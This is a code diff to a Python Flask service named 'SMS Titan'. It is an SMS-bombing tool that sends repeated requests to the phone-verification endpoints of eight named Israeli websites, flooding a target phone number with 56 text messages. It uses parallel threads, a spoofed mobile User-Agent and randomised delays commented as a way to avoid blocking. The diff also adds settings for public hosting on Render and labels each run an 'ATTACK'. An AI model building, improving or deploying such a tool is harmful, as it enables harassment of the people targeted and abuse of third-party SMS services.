@@ -275,13 +275,15 @@ import concurrent.futures
 import requests
 import random
 import time
+import os
 from flask import Flask, jsonify, request
 from flask_cors import CORS
 
 app = Flask(__name__)
+# מאפשר לאפליקציית ה-Lovable שלך לגשת ל-API ללא חסימות אבטחה
 CORS(app)
 
-# רשימת ה-8 המנצחים שעובדים ב-100%
+# רשימת ה-8 המנצחים שאישרת שעובדים ב-100%
 SITES = [
     {"name": "Femina", "url": "https://femina.co.il/apps/feminaapp/auth/send-code", "type": "json", "body": {"phone": "{phone}"}},
     {"name": "Housemen", "url": "https://housemen.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=simply-check-member-cellphone&cellphone={phone}"},
@@ -294,7 +296,7 @@ SITES = [
 ]
 
 def send_burst(node, phone, repeats=7):
-    """שולח 7 סמסים מאותו אתר בהשהיה"""
+    """מבצע שליחה חוזרת מאותו אתר עם השהיה למניעת חסימה"""
     session = requests.Session()
     headers = {
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
@@ -313,30 +315,37 @@ def send_burst(node, phone, repeats=7):
                 payload = node["body"].replace("{phone}", phone)
                 res = session.post(node["url"], data=payload, headers=headers, timeout=10)
             
-            print(f"[*] {node['name']} (Burst {i+1}/7): {res.status_code}")
+            print(f"[*] {node['name']} ({i+1}/7): {res.status_code}")
             time.sleep(random.uniform(5, 8)) 
             
         except Exception as e:
-            print(f"[!] Error in {node['name']} burst: {e}")
+            print(f"[!] Error in {node['name']}: {e}")
             break
+
+@app.route('/', methods=['GET', 'HEAD'])
+def health_check():
+    """נתיב שמוודא שהשרת חי (מונע שגיאות 404 ב-Render)"""
+    return jsonify({"status": "online", "message": "SMS Titan is running"}), 200
 
 @app.route('/launch', methods=['POST'])
 def launch():
-    # התיקון כאן: חילוץ המספר מהבקשה שנשלחת מהאתר
+    """הנתיב המרכזי שמקבל את מספר הטלפון ומפעיל את המערכת"""
     data = request.get_json()
     target = data.get('phone') if data else None
     
     if not target:
-        return jsonify({"status": "error", "message": "Phone number is missing"}), 400
+        return jsonify({"status": "error", "message": "No phone number provided"}), 400
 
-    print(f"\n--- INITIATING 56-SMS BURST ON {target} ---\n")
+    print(f"\n--- INITIATING 56-SMS ATTACK ON {target} ---\n")
     
-    # שליחה במקביל לכל האתרים
-    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
+    # הפעלה מקבילית של ה-Threads
+    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
         for node in SITES:
             executor.submit(send_burst, node, target)
             
-    return jsonify({"status": "burst_initiated", "target": target})
+    return jsonify({"status": "success", "target": target})
 
 if __name__ == '__main__':
-    app.run(port=5000)
+    # הגדרות חובה עבור Render
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
